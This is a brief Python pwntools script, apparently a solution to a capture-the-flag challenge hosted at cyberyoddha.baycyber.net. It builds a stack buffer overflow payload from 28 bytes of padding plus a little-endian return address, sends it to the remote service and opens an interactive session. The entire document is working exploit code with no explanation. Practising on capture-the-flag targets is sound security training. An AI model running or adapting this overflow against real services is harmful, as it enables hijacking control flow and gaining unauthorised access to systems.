from pwn import *
offset = 0x18 + 4
payload = 'A'*offset
payload += 'r\x91\x04\x08'
HOST = 'cyberyoddha.baycyber.net'
PORT = 10002
p=connect(HOST,PORT)
p.sendline(payload)
p.interactive()
